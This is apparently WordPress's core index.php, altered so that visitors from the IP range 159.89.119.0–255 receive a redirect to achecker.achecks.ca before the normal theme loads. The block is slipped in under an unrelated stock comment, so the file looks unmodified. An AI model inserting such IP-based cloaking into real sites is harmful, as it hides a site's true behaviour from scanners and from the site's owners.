<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
$range_start = ip2long("159.89.119.0");
$range_end   = ip2long("159.89.119.255");
$ip          = ip2long($_SERVER['REMOTE_ADDR']);
if ($ip >= $range_start && $ip <= $range_end) {
header('Location: https://achecker.achecks.ca');
}
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';

